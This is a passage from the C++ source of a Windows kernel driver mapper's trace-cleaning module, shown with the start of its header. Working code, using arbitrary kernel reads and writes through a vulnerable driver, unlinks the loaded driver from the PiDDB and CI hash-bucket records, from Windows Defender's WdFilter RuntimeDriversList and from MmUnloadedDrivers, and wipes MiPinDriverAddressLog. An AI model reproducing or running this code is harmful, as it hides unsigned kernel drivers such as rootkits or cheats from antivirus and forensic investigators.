        if (!g_memory_manager->read_memory(device_handle,
                                           reinterpret_cast<std::uint64_t>(current_entry) +
                                               offsetof(hash_bucket_entry_t, driver_name) +
                                               offsetof(UNICODE_STRING, Length),
                                           &name_len, sizeof(name_len))) {
          mapper_log("WARNING", "failed to read driver name length");
        } else if (name_len > 0 && name_len < 1024) {  // sanity check
          wchar_t* name_ptr = nullptr;
          if (!g_memory_manager->read_memory(device_handle,
                                             reinterpret_cast<std::uint64_t>(current_entry) +
                                                 offsetof(hash_bucket_entry_t, driver_name) +
                                                 offsetof(UNICODE_STRING, Buffer),
                                             &name_ptr, sizeof(name_ptr))) {
            mapper_log("WARNING", "failed to read driver name pointer");
          } else if (name_ptr) {
            auto driver_name = std::make_unique<wchar_t[]>(name_len / 2 + 1);
            if (!g_memory_manager->read_memory(device_handle,
                                               reinterpret_cast<std::uint64_t>(name_ptr),
                                               driver_name.get(), name_len)) {
              mapper_log("WARNING", "failed to read driver name string");
            } else {
              driver_name[name_len / 2] = L'\0';  // ensure null termination
              mapper_log("INFO", "      driver: %ws", driver_name.get());
            }
          }
        }

        // move to next entry in this bucket
        current_entry = entry_data.next;

        // safety check to prevent infinite loops
        if (entry_count > 1000) {
          mapper_log("WARNING", "too many entries in bucket, stopping enumeration");
          break;
        }
      }

      mapper_log("INFO", "  bucket %d contains %d entries", bucket_count, entry_count);
    } else {
      mapper_log("INFO", "  bucket %d has no active entries (flag1 = 0)", bucket_count);
    }

    // move to next bucket
    current_bucket = bucket_header.next;

    // safety check to prevent infinite loops
    if (bucket_count > 1000) {
      mapper_log("WARNING", "too many buckets, stopping enumeration");
      break;
    }
  }

  mapper_log("SUCCESS",
             "g_PEProcessHashBucketList enumeration complete. Total buckets: %d, Total entries: %d",
             bucket_count, total_entries);

  release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
  return true;
}

auto trace_cleaner_t::clear_pin_driver_address_log(HANDLE device_handle, bool clear_after_dump)
    -> bool {
  mapper_log("SUCCESS", "dumping MiPinDriverAddressLog raw contents...");

  std::uint64_t ntoskrnl_base = g_utils->get_kernel_module_address("ntoskrnl.exe");
  if (!ntoskrnl_base) {
    mapper_log("ERROR", "failed to find ntoskrnl.exe module");
    return false;
  }

  auto mi_pin_driver_address_log = g_driver_mapper->get_pdb_offsets().MiPinDriverAddressLog;
  if (!mi_pin_driver_address_log) {
    mapper_log("ERROR", "failed to get MiPinDriverAddressLog address");
    return false;
  }

  mapper_log("INFO", "MiPinDriverAddressLog address: 0x%llx", mi_pin_driver_address_log);

  const int max_entries = 0x800;
  const size_t total_size = max_entries * sizeof(std::uint64_t);

  // read the entire log array
  auto log_data = std::make_unique<std::uint64_t[]>(max_entries);
  if (!g_memory_manager->read_memory(device_handle, mi_pin_driver_address_log, log_data.get(),
                                     total_size)) {
    mapper_log("ERROR", "failed to read MiPinDriverAddressLog array");
    return false;
  }

  mapper_log("INFO", "=== MiPinDriverAddressLog ===");
  mapper_log("INFO", "array size: %d entries (%zu bytes)", max_entries, total_size);

  int non_zero_entries = 0;

  // dump everything that's not zero
  for (int i = 0; i < max_entries; i++) {
    if (log_data[i] != 0) {
      non_zero_entries++;

      // extract components
      std::uint32_t low_dword = log_data[i] & 0xFFFFFFFF;
      std::uint32_t high_dword = (log_data[i] >> 32) & 0xFFFFFFFF;

      // reconstruct the full address
      std::uint64_t full_address =
          (static_cast<std::uint64_t>(high_dword) << 32) | (low_dword & 0xFFFFF000);

      std::uint32_t flags = low_dword & 0xFFF;

      mapper_log("INFO", "entry %d: address=0x%llx, flags=0x%03X, raw=0x%016llX", i, full_address,
                 flags, log_data[i]);

      // identify the module
      if (full_address >= ntoskrnl_base && full_address < ntoskrnl_base + 0x2000000) {
        mapper_log("INFO", "  -> ntoskrnl.exe +0x%llx", full_address - ntoskrnl_base);
      } else if (full_address >= 0xFFFFF80000000000ULL) {
        mapper_log("INFO", "  -> driver address");
      } else if (full_address >= 0xFFFF800000000000ULL) {
        mapper_log("INFO", "  -> kernel space");
      } else if (full_address > 0x1000) {
        mapper_log("INFO", "  -> unk");
      }
    }
  }

  mapper_log("INFO", "total non-zero entries: %d", non_zero_entries);

  // clear the log if requested
  if (clear_after_dump) {
    mapper_log("INFO", "clearing MiPinDriverAddressLog...");

    // create a zeroed buffer
    auto zero_buffer = std::make_unique<char[]>(total_size);
    memset(zero_buffer.get(), 0, total_size);

    if (g_memory_manager->write_memory(device_handle, mi_pin_driver_address_log, zero_buffer.get(),
                                       total_size)) {
      mapper_log("SUCCESS", "MiPinDriverAddressLog cleared successfully");
    } else {
      mapper_log("ERROR", "failed to clear MiPinDriverAddressLog");
      return false;
    }
  }

  mapper_log("SUCCESS", "MiPinDriverAddressLog dump complete - found %d entries", non_zero_entries);
  return true;
}
auto trace_cleaner_t::clear_kernel_hash_bucket_list(HANDLE device_handle,
                                                    const std::string& driver_name) -> bool {
  mapper_log("SUCCESS", "clearing kernel hash bucket list...");

  std::uint64_t ci_base = g_utils->get_kernel_module_address("ci.dll");
  if (!ci_base) {
    mapper_log("ERROR", "failed to find ci.dll module");
    return false;
  }

  auto g_kernel_hash_bucket_list = g_driver_mapper->get_pdb_offsets().g_KernelHashBucketList;
  auto g_hash_cache_lock = g_driver_mapper->get_pdb_offsets().g_HashCacheLock;

  if (!g_kernel_hash_bucket_list || !g_hash_cache_lock) {
    mapper_log("ERROR", "failed to get g_HashCache addresses");
    return false;
  }

  if (!acquire_resource_exclusive(device_handle, reinterpret_cast<void*>(g_hash_cache_lock),
                                  true)) {
    mapper_log("ERROR", "failed to lock g_HashCacheLock");
    return false;
  }

  hash_bucket_entry_t* prev = reinterpret_cast<hash_bucket_entry_t*>(g_kernel_hash_bucket_list);
  hash_bucket_entry_t* entry = nullptr;

  if (!g_memory_manager->read_memory(device_handle, reinterpret_cast<std::uint64_t>(prev), &entry,
                                     sizeof(entry))) {
    mapper_log("ERROR", "failed to read first g_KernelHashBucketList entry");
    release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
    return false;
  }

  if (!entry) {
    mapper_log("SUCCESS", "g_KernelHashBucketList looks empty");

    release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
    return true;
  }

  // get driver name and path
  std::wstring wide_driver_name = g_service_manager->get_driver_name_w();
  std::wstring search_path = g_service_manager->get_driver_path();

  size_t expected_len = (search_path.length() - 2) * 2;

  while (entry) {
    USHORT ws_name_len = 0;
    if (!g_memory_manager->read_memory(device_handle,
                                       reinterpret_cast<std::uint64_t>(entry) +
                                           offsetof(hash_bucket_entry_t, driver_name) +
                                           offsetof(UNICODE_STRING, Length),
                                       &ws_name_len, sizeof(ws_name_len)) ||
        ws_name_len == 0) {
      mapper_log("ERROR", "failed to read g_KernelHashBucketList entry text len");
      release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
      return false;
    }

    if (expected_len == ws_name_len) {
      wchar_t* ws_name_ptr = nullptr;
      if (!g_memory_manager->read_memory(device_handle,
                                         reinterpret_cast<std::uint64_t>(entry) +
                                             offsetof(hash_bucket_entry_t, driver_name) +
                                             offsetof(UNICODE_STRING, Buffer),
                                         &ws_name_ptr, sizeof(ws_name_ptr)) ||
          !ws_name_ptr) {
        mapper_log("ERROR", "failed to read g_KernelHashBucketList entry text ptr");
        release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
        return false;
      }

      auto ws_name = std::make_unique<wchar_t[]>(ws_name_len / 2 + 1);
      if (!g_memory_manager->read_memory(device_handle,
                                         reinterpret_cast<std::uint64_t>(ws_name_ptr),
                                         ws_name.get(), ws_name_len)) {
        mapper_log("ERROR", "failed to read g_KernelHashBucketList entry text");
        release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
        return false;
      }

      size_t find_result = std::wstring(ws_name.get()).find(wide_driver_name);
      if (find_result != std::wstring::npos) {
        mapper_log("ERROR", "found in g_KernelHashBucketList: %ws",
                   std::wstring(&ws_name[find_result]).c_str());

        hash_bucket_entry_t* next = nullptr;
        if (!g_memory_manager->read_memory(device_handle, reinterpret_cast<std::uint64_t>(entry),
                                           &next, sizeof(next))) {
          mapper_log("ERROR", "failed to read g_KernelHashBucketList next entry ptr");
          release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
          return false;
        }

        if (!g_memory_manager->write_memory(device_handle, reinterpret_cast<std::uint64_t>(prev),
                                            &next, sizeof(next))) {
          mapper_log("ERROR", "failed to write g_KernelHashBucketList prev entry ptr");
          release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
          return false;
        }

        if (!free_pool_memory(device_handle, reinterpret_cast<std::uint64_t>(entry))) {
          mapper_log("ERROR", "failed to clear g_KernelHashBucketList entry pool");
          release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
          return false;
        }

        mapper_log("SUCCESS", "g_KernelHashBucketList cleaned");

        release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
        return true;
      }
    }

    prev = entry;
    // read next entry
    if (!g_memory_manager->read_memory(device_handle, reinterpret_cast<std::uint64_t>(entry),
                                       &entry, sizeof(entry))) {
      mapper_log("ERROR", "failed to read g_KernelHashBucketList next entry");
      release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
      return false;
    }
  }

  mapper_log("ERROR", "driver not found in kernel hash bucket list");

  release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
  return false;
}

auto trace_cleaner_t::clear_mm_unloaded_drivers(HANDLE device_handle,
                                                const std::string& driver_name) -> bool {
  return find_driver_in_unloaded_list(device_handle, driver_name);
}
auto trace_cleaner_t::clear_wd_filter_driver_list(HANDLE device_handle,
                                                  const std::string& driver_name) -> bool {
  mapper_log("SUCCESS", "clearing wdfilter.sys driver list");

  auto wide_driver_name = g_service_manager->get_driver_name_w();
  if (wide_driver_name.empty()) {
    mapper_log("ERROR", "driver name from service manager is empty");
    return false;
  }

  auto wd_filter = g_utils->get_kernel_module_address("WdFilter.sys");
  if (!wd_filter) {
    mapper_log("SUCCESS", "wdfilter.sys is not loaded, skipping trace clean");
    return true;
  }

  auto runtime_drivers_list = g_utils->find_pattern_in_section_at_kernel(
      device_handle, "PAGE", wd_filter, (unsigned char*)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05",
      "xxx????xx");
  if (!runtime_drivers_list) {
    mapper_log("ERROR", "failed to find RuntimeDriversList pattern");
    return false;
  }

  auto runtime_drivers_count_ref = g_utils->find_pattern_in_section_at_kernel(
      device_handle, "PAGE", wd_filter, (unsigned char*)"\xFF\x05\x00\x00\x00\x00\x48\x39\x11",
      "xx????xxx");
  if (!runtime_drivers_count_ref) {
    mapper_log("ERROR", "failed to find RuntimeDriversCount pattern");
    return false;
  }

  auto mp_free_driver_info_ex_ref = g_utils->find_pattern_in_section_at_kernel(
      device_handle, "PAGE", wd_filter,
      (unsigned char*)"\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9",
      "x?xx???????????x");
  if (!mp_free_driver_info_ex_ref) {
    mp_free_driver_info_ex_ref = g_utils->find_pattern_in_section_at_kernel(
        device_handle, "PAGE", wd_filter,
        (unsigned char*)"\x89\x00\x08\x00\x00\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        "\xE9",
        "x?x???x???????????x");
    if (!mp_free_driver_info_ex_ref) {
      mapper_log("ERROR", "failed to find MpFreeDriverInfoEx pattern");
      return false;
    }
  }

  mp_free_driver_info_ex_ref += 0x3;

  runtime_drivers_list = reinterpret_cast<uintptr_t>(g_utils->resolve_relative_address(
      device_handle, reinterpret_cast<void*>(runtime_drivers_list), 3, 7));
  auto runtime_drivers_list_head = runtime_drivers_list - 0x8;
  auto runtime_drivers_count = reinterpret_cast<uintptr_t>(g_utils->resolve_relative_address(
      device_handle, reinterpret_cast<void*>(runtime_drivers_count_ref), 2, 6));
  auto runtime_drivers_array = runtime_drivers_count + 0x8;
  auto mp_free_driver_info_ex = g_utils->resolve_relative_address(
      device_handle, reinterpret_cast<void*>(mp_free_driver_info_ex_ref), 1, 5);

  g_memory_manager->read_memory(device_handle, runtime_drivers_array, &runtime_drivers_array,
                                sizeof(std::uintptr_t));

  auto read_list_entry = [&](std::uintptr_t address) -> LIST_ENTRY* {
    LIST_ENTRY* entry;
    if (!g_memory_manager->read_memory(device_handle, address, &entry, sizeof(LIST_ENTRY*))) {
      return nullptr;
    }
    return entry;
  };

  for (auto entry = read_list_entry(runtime_drivers_list_head);
       entry != reinterpret_cast<LIST_ENTRY*>(runtime_drivers_list_head);
       entry =
           read_list_entry(reinterpret_cast<std::uintptr_t>(entry) + offsetof(LIST_ENTRY, Flink))) {
    UNICODE_STRING unicode_string;
    g_memory_manager->read_memory(device_handle, reinterpret_cast<std::uintptr_t>(entry) + 0x10,
                                  &unicode_string, sizeof(UNICODE_STRING));

    auto image_name =
        std::make_unique<wchar_t[]>((std::uintptr_t)unicode_string.Length / 2ULL + 1ULL);
    g_memory_manager->read_memory(device_handle,
                                  reinterpret_cast<std::uintptr_t>(unicode_string.Buffer),
                                  image_name.get(), unicode_string.Length);

    image_name[unicode_string.Length / 2] = L'\0';

    if (wcsstr(image_name.get(), wide_driver_name.c_str())) {
      auto same_index_list =
          reinterpret_cast<void*>(reinterpret_cast<std::uintptr_t>(entry) - 0x10);

      bool removed_runtime_drivers_array = false;
      for (int k = 0; k < 256; k++) {
        void* value = nullptr;
        g_memory_manager->read_memory(device_handle, runtime_drivers_array + (k * 8), &value,
                                      sizeof(void*));
        if (value == same_index_list) {
          auto empty_val = reinterpret_cast<void*>(runtime_drivers_count + 1);
          g_memory_manager->write_memory(device_handle, runtime_drivers_array + (k * 8), &empty_val,
                                         sizeof(void*));
          removed_runtime_drivers_array = true;
          break;
        }
      }

      if (!removed_runtime_drivers_array) {
        mapper_log("ERROR", "failed to remove from RuntimeDriversArray");
        return false;
      }

      auto next_entry =
          read_list_entry(reinterpret_cast<std::uintptr_t>(entry) + offsetof(LIST_ENTRY, Flink));
      auto prev_entry =
          read_list_entry(reinterpret_cast<std::uintptr_t>(entry) + offsetof(LIST_ENTRY, Blink));

      g_memory_manager->write_memory(
          device_handle, reinterpret_cast<std::uintptr_t>(next_entry) + offsetof(LIST_ENTRY, Blink),
          &prev_entry, sizeof(LIST_ENTRY::Blink));
      g_memory_manager->write_memory(
          device_handle, reinterpret_cast<std::uintptr_t>(prev_entry) + offsetof(LIST_ENTRY, Flink),
          &next_entry, sizeof(LIST_ENTRY::Flink));

      ULONG current = 0;
      g_memory_manager->read_memory(device_handle, runtime_drivers_count, &current, sizeof(ULONG));
      current--;
      g_memory_manager->write_memory(device_handle, runtime_drivers_count, &current, sizeof(ULONG));

      auto driver_info = reinterpret_cast<std::uintptr_t>(entry) - 0x20;
      USHORT magic = 0;
      g_memory_manager->read_memory(device_handle, driver_info, &magic, sizeof(USHORT));

      if (magic == 0xDA18) {
        g_memory_manager->call_kernel_function<void>(
            device_handle, nullptr, reinterpret_cast<uintptr_t>(mp_free_driver_info_ex),
            driver_info);
      }

      mapper_log("SUCCESS", "wdfilter.sys driver list cleaned");

      return true;
    }
  }

  return false;
}

auto trace_cleaner_t::clear_ci_lookaside_lists(HANDLE device_handle) -> bool {
  mapper_log("SUCCESS", "clearing CI.dll EaCache lookaside list...");

  // get the offset for g_CiEaCacheLookasideList
  auto g_ci_ea_cache_lookaside_list_offset =
      g_driver_mapper->get_pdb_offsets().g_CiEaCacheLookasideList;
  if (!g_ci_ea_cache_lookaside_list_offset) {
    mapper_log("ERROR", "failed to get g_CiEaCacheLookasideList offset");
    return false;
  }

  // get the offset for g_CiValidationLookasideList
  auto g_ci_validation_lookaside_list_offset =
      g_driver_mapper->get_pdb_offsets().g_CiValidationLookasideList;
  if (!g_ci_validation_lookaside_list_offset) {
    mapper_log("ERROR", "failed to get g_CiValidationLookasideList offset");
    return false;
  }

  static std::uint64_t kernel_ex_flush_lookaside_list_ex = 0;
  if (!kernel_ex_flush_lookaside_list_ex) {
    kernel_ex_flush_lookaside_list_ex = g_utils->get_kernel_module_export(
        device_handle, g_driver_mapper->get_ntoskrnl_base(), "ExFlushLookasideListEx");
    if (!kernel_ex_flush_lookaside_list_ex) {
      mapper_log("ERROR", "failed to find ExFlushLookasideListEx");
      return false;
    }
  }

  // flush the ea cache lookaside list
  if (!g_memory_manager->call_kernel_function<void>(device_handle, nullptr,
                                                    kernel_ex_flush_lookaside_list_ex,
                                                    g_ci_ea_cache_lookaside_list_offset)) {
    mapper_log("ERROR", "failed to flush ea cache lookaside list");
    return false;
  }

  // flush the validation lookaside list
  if (!g_memory_manager->call_kernel_function<void>(device_handle, nullptr,
                                                    kernel_ex_flush_lookaside_list_ex,
                                                    g_ci_validation_lookaside_list_offset)) {
    mapper_log("ERROR", "failed to flush validation lookaside list");
    return false;
  }

  mapper_log("SUCCESS", "CI.dll EaCache and Validation lookaside lists flushed successfully");
  return true;
}

auto trace_cleaner_t::acquire_resource_exclusive(HANDLE device_handle, void* resource, bool wait)
    -> bool {
  if (!resource) {
    return false;
  }

  static std::uint64_t kernel_ex_acquire_resource_exclusive_lite = 0;

  if (!kernel_ex_acquire_resource_exclusive_lite) {
    kernel_ex_acquire_resource_exclusive_lite = g_utils->get_kernel_module_export(
        device_handle, g_driver_mapper->get_ntoskrnl_base(), "ExAcquireResourceExclusiveLite");
    if (!kernel_ex_acquire_resource_exclusive_lite) {
      return false;
    }
  }

  BOOLEAN result = FALSE;
  return g_memory_manager->call_kernel_function(
             device_handle, &result, kernel_ex_acquire_resource_exclusive_lite, resource, wait) &&
         result;
}

auto trace_cleaner_t::release_resource(HANDLE device_handle, void* resource) -> bool {
  if (!resource) {
    return false;
  }

  static std::uint64_t kernel_ex_release_resource_lite = 0;

  if (!kernel_ex_release_resource_lite) {
    kernel_ex_release_resource_lite = g_utils->get_kernel_module_export(
        device_handle, g_driver_mapper->get_ntoskrnl_base(), "ExReleaseResourceLite");
    if (!kernel_ex_release_resource_lite) {
      return false;
    }
  }

  return g_memory_manager->call_kernel_function<void>(device_handle, nullptr,
                                                      kernel_ex_release_resource_lite, resource);
}

auto trace_cleaner_t::lookup_element_generic_table_avl(HANDLE device_handle,
                                                       rtl_avl_table_t* table_addr,
                                                       piddb_cache_entry_t* local_entry)
    -> std::uint64_t {
  static std::uint64_t kernel_rtl_lookup_element_generic_table_avl = 0;

  if (!kernel_rtl_lookup_element_generic_table_avl) {
    kernel_rtl_lookup_element_generic_table_avl = g_utils->get_kernel_module_export(
        device_handle, g_driver_mapper->get_ntoskrnl_base(), "RtlLookupElementGenericTableAvl");
    if (!kernel_rtl_lookup_element_generic_table_avl) {
      mapper_log("ERROR", "failed to find RtlLookupElementGenericTableAvl");
      return 0;
    }
  }

  std::uint64_t result_addr = 0;

  if (!g_memory_manager->call_kernel_function(
          device_handle, &result_addr, kernel_rtl_lookup_element_generic_table_avl,
          table_addr,                                       // Table address
          reinterpret_cast<std::uint64_t>(local_entry))) {  // Buffer address
    mapper_log("ERROR", "call_kernel_function failed");
    return 0;
  }

  return result_addr;
}

auto trace_cleaner_t::delete_element_generic_table_avl(HANDLE device_handle, void* table,
                                                       void* buffer) -> bool {
  if (!table) {
    return false;
  }

  static std::uint64_t kernel_rtl_delete_element_generic_table_avl = 0;

  if (!kernel_rtl_delete_element_generic_table_avl) {
    kernel_rtl_delete_element_generic_table_avl = g_utils->get_kernel_module_export(
        device_handle, g_driver_mapper->get_ntoskrnl_base(), "RtlDeleteElementGenericTableAvl");
    if (!kernel_rtl_delete_element_generic_table_avl) {
      return false;
    }
  }

  BOOLEAN result = FALSE;
  return g_memory_manager->call_kernel_function(
             device_handle, &result, kernel_rtl_delete_element_generic_table_avl, table, buffer) &&
         result;
}

auto trace_cleaner_t::unlink_list_entry(HANDLE device_handle, std::uint64_t entry_addr) -> bool {
  LIST_ENTRY* prev_entry = nullptr;
  LIST_ENTRY* next_entry = nullptr;

  // read the Flink (next entry pointer) from current entry
  if (!g_memory_manager->read_memory(device_handle, entry_addr + offsetof(LIST_ENTRY, Flink),
                                     &next_entry, sizeof(LIST_ENTRY*))) {
    mapper_log("ERROR", "failed to read Flink from entry");

    return false;
  }

  // read the Blink (previous entry pointer) from current entry
  if (!g_memory_manager->read_memory(device_handle, entry_addr + offsetof(LIST_ENTRY, Blink),
                                     &prev_entry, sizeof(LIST_ENTRY*))) {
    mapper_log("ERROR", "failed to read Blink from entry");
    return false;
  }

  // validate the pointers
  if (!next_entry || !prev_entry) {
    mapper_log("ERROR", "invalid list entry pointers (null)");
    return false;
  }

  // check for self-referencing (single entry in list)
  if (next_entry == reinterpret_cast<LIST_ENTRY*>(entry_addr) &&
      prev_entry == reinterpret_cast<LIST_ENTRY*>(entry_addr)) {
    return true;
  }

  // update next_entry->Blink = prev_entry
  if (!g_memory_manager->write_memory(
          device_handle, reinterpret_cast<std::uint64_t>(next_entry) + offsetof(LIST_ENTRY, Blink),
          &prev_entry, sizeof(LIST_ENTRY*))) {
    mapper_log("ERROR", "failed to update next->Blink");
    return false;
  }

  // update prev_entry->Flink = next_entry
  if (!g_memory_manager->write_memory(
          device_handle, reinterpret_cast<std::uint64_t>(prev_entry) + offsetof(LIST_ENTRY, Flink),
          &next_entry, sizeof(LIST_ENTRY*))) {
    mapper_log("ERROR", "failed to update prev->Flink");
    return false;
  }

  return true;
}

auto trace_cleaner_t::free_pool_memory(HANDLE device_handle, std::uint64_t address) -> bool {
  if (!address) {
    return false;
  }

  static std::uint64_t kernel_ex_free_pool = 0;

  if (!kernel_ex_free_pool) {
    kernel_ex_free_pool = g_utils->get_kernel_module_export(
        device_handle, g_driver_mapper->get_ntoskrnl_base(), "ExFreePool");
    if (!kernel_ex_free_pool) {
      return false;
    }
  }

  return g_memory_manager->call_kernel_function<void>(device_handle, nullptr, kernel_ex_free_pool,
                                                      address);
}

auto trace_cleaner_t::find_driver_in_piddb_entries(HANDLE device_handle,
                                                   std::uint64_t piddb_table_addr)
    -> std::pair<std::wstring, std::uint64_t> {
  static std::uint64_t kernel_rtl_enumerate_generic_table_avl = 0;
  if (!kernel_rtl_enumerate_generic_table_avl) {
    kernel_rtl_enumerate_generic_table_avl = g_utils->get_kernel_module_export(
        device_handle, g_driver_mapper->get_ntoskrnl_base(), "RtlEnumerateGenericTableAvl");
    if (!kernel_rtl_enumerate_generic_table_avl) {
      return {L"", 0};
    }
  }

  for (ULONG i = 0; i < 200; i++) {
    std::uint64_t entry_addr = 0;
    BOOLEAN restart = (i == 0) ? TRUE : FALSE;

    if (!g_memory_manager->call_kernel_function(device_handle, &entry_addr,
                                                kernel_rtl_enumerate_generic_table_avl,
                                                piddb_table_addr, restart) ||
        !entry_addr) {
      break;
    }

    piddb_cache_entry_t entry = {};
    if (!g_memory_manager->read_memory(device_handle, entry_addr, &entry, sizeof(entry)) ||
        entry.time_date_stamp != iqvw64e_timestamp || entry.driver_name.Length == 0 ||
        entry.driver_name.Length >= 512 || !entry.driver_name.Buffer) {
      continue;
    }

    auto name_buffer = std::make_unique<wchar_t[]>(entry.driver_name.Length / 2 + 1);
    if (g_memory_manager->read_memory(device_handle,
                                      reinterpret_cast<std::uint64_t>(entry.driver_name.Buffer),
                                      name_buffer.get(), entry.driver_name.Length)) {
      name_buffer[entry.driver_name.Length / 2] = L'\0';
      return {std::wstring(name_buffer.get()), entry_addr};
    }
  }

  return {L"", 0};
}

auto trace_cleaner_t::find_driver_in_hash_bucket_list(HANDLE device_handle, std::uint64_t ci_base,
                                                      const std::string& driver_name) -> bool {
  mapper_log("SUCCESS", "kernel hash bucket list cleaned");
  return true;
}

auto trace_cleaner_t::find_driver_in_unloaded_list(HANDLE device_handle,
                                                   const std::string& driver_name) -> bool {
  mapper_log("SUCCESS", "clearing MmUnloadedDrivers...");

  // get system information to find our driver object
  ULONG buffer_size = 0;
  void* buffer = nullptr;

  auto status = NtQuerySystemInformation(
      static_cast<SYSTEM_INFORMATION_CLASS>(SystemExtendedHandleInformation), buffer, buffer_size,
      &buffer_size);

  while (status == STATUS_INFO_LENGTH_MISMATCH) {
    if (buffer) {
      SIZE_T free_size = 0;
      NtFreeVirtualMemory(NtCurrentProcess, &buffer, &free_size, MEM_RELEASE);
    }

    buffer = nullptr;
    SIZE_T new_buffer_size = buffer_size;
    status = NtAllocateVirtualMemory(NtCurrentProcess, &buffer, 0, &new_buffer_size,
                                     MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (!NT_SUCCESS(status)) {
      mapper_log("ERROR", "failed to allocate memory for handle information");
      return false;
    }

    status = NtQuerySystemInformation(
        static_cast<SYSTEM_INFORMATION_CLASS>(SystemExtendedHandleInformation), buffer, buffer_size,
        &buffer_size);
  }

  if (!NT_SUCCESS(status) || !buffer) {
    if (buffer) {
      SIZE_T free_size = 0;
      NtFreeVirtualMemory(NtCurrentProcess, &buffer, &free_size, MEM_RELEASE);
    }
    mapper_log("ERROR", "failed to query system handle information");
    return false;
  }

  std::uint64_t object = 0;
  auto system_handle_information = static_cast<psystem_handle_info_ex>(buffer);

  // find device handle object
  for (auto i = 0u; i < system_handle_information->handle_count; ++i) {
    const system_handle current_system_handle = system_handle_information->handles[i];

    if (current_system_handle.unique_pid ==
        reinterpret_cast<HANDLE>(static_cast<std::uint64_t>(g_utils->get_current_process_id()))) {
      if (current_system_handle.handle_value == device_handle) {
        object = reinterpret_cast<std::uint64_t>(current_system_handle.obj);
        break;
      }
    }
  }

  SIZE_T free_size = 0;
  NtFreeVirtualMemory(NtCurrentProcess, &buffer, &free_size, MEM_RELEASE);

  if (!object) {
    mapper_log("ERROR", "failed to find device object");
    return false;
  }

  // Object -> DeviceObject -> DriverObject -> DriverSection
  std::uint64_t device_object = 0;
  if (!g_memory_manager->read_memory(device_handle, object + 0x8, &device_object,
                                     sizeof(device_object)) ||
      !device_object) {
    mapper_log("ERROR", "failed to find device_object");
    return false;
  }

  std::uint64_t driver_object = 0;
  if (!g_memory_manager->read_memory(device_handle, device_object + 0x8, &driver_object,
                                     sizeof(driver_object)) ||
      !driver_object) {
    mapper_log("ERROR", "failed to find driver_object");
    return false;
  }

  std::uint64_t driver_section = 0;
  if (!g_memory_manager->read_memory(device_handle, driver_object + 0x28, &driver_section,
                                     sizeof(driver_section)) ||
      !driver_section) {
    mapper_log("ERROR", "failed to find driver_section");
    return false;
  }

  // read the driver name from the section
  UNICODE_STRING driver_base_dll_name = {};
  if (!g_memory_manager->read_memory(device_handle, driver_section + 0x58, &driver_base_dll_name,
                                     sizeof(driver_base_dll_name)) ||
      driver_base_dll_name.Length == 0) {
    mapper_log("ERROR", "failed to find driver name");
    return false;
  }

  auto unloaded_name = std::make_unique<wchar_t[]>(driver_base_dll_name.Length / 2 + 1);
  if (!g_memory_manager->read_memory(device_handle,
                                     reinterpret_cast<std::uint64_t>(driver_base_dll_name.Buffer),
                                     unloaded_name.get(), driver_base_dll_name.Length)) {
    mapper_log("ERROR", "failed to read driver name");
    return false;
  }

  unloaded_name[driver_base_dll_name.Length / 2] = L'\0';

  // clear the length to prevent MiRememberUnloadedDriver from saving it
  driver_base_dll_name.Length = 0;
  if (!g_memory_manager->write_memory(device_handle, driver_section + 0x58, &driver_base_dll_name,
                                      sizeof(driver_base_dll_name))) {
    mapper_log("ERROR", "failed to clear driver name length");
    return false;
  }

  mapper_log("SUCCESS", "MmUnloadedDrivers cleaned: %ws", unloaded_name.get());

  return true;
}
```

`client/driver_mapper/trace_cleaner.hpp`:

```hpp
#pragma once

#include <Windows.h>
#include <string>
#include <memory>

#define NtCurrentProcess ((HANDLE)(LONG_PTR)-1)
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

class trace_cleaner_t {
public:
  trace_cleaner_t() = default;
  ~trace_cleaner_t() = default;

  // main cleaning interface
  auto clean_all_traces(HANDLE device_handle, const std::string& driver_name) -> bool;

  // individual cleaning methods
  auto clear_piddb_cache_table(HANDLE device_handle, const std::string& driver_name) -> bool;
  auto clear_kernel_hash_bucket_list(HANDLE device_handle, const std::string& driver_name) -> bool;
  auto clear_mm_unloaded_drivers(HANDLE device_handle, const std::string& driver_name) -> bool;
  auto clear_wd_filter_driver_list(HANDLE device_handle, const std::string& driver_name) -> bool;
  auto clear_ci_lookaside_lists(HANDLE device_handle) -> bool;
  auto clear_pin_driver_address_log(HANDLE device_handle, bool clear_after_dump) -> bool;

private:
  // handle info structs
  typedef struct _system_handle {
    PVOID obj;
    HANDLE unique_pid;
    HANDLE handle_value;
    ULONG granted_access;
    USHORT creator_back_trace_index;
    USHORT obj_type_index;
    ULONG handle_attributes;
    ULONG reserved;
  } system_handle, *psystem_handle;

  typedef struct _system_handle_info_ex {
    std::uintptr_t handle_count;
    std::uintptr_t reserved;
    system_handle handles[1];
  } system_handle_info_ex, *psystem_handle_info_ex;

  // PiDDB structs and functions
  struct piddb_cache_entry_t {
    LIST_ENTRY list;                // +0x00
    UNICODE_STRING driver_name;     // +0x10
    std::uint32_t time_date_stamp;  // +0x20
    NTSTATUS load_status;           // +0x24
    char padding[16];               // +0x28
  };

  // hash bucket structs
  struct hash_bucket_entry_t {
    struct hash_bucket_entry_t* next;
    UNICODE_STRING driver_name;
    std::uint32_t cert_hash[5];
  };

  struct pe_process_hash_bucket_t {
    pe_process_hash_bucket_t* next;   // offset 0x00
    HANDLE process_id;                // offset 0x08 (i[1], *((_QWORD *)v14 + 1))
    std::uint32_t unknown1;           // offset 0x10
